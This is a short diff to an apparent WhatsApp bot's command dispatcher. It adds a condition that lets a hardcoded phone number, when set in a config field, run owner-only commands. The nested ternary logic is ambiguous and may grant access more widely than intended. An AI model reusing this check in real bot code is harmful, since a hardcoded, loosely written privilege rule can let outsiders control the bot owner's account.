@@ -200,7 +200,12 @@ plugins.map(async (plugin) => {
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                 }
 		    
-		    
+		     if ((OWNE.ff == "94769370897,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',')
+                    .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',')
+                    .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                    if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                    else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
+                }    
 		/*    
 		    var chat = msg.key.remoteJid
                         
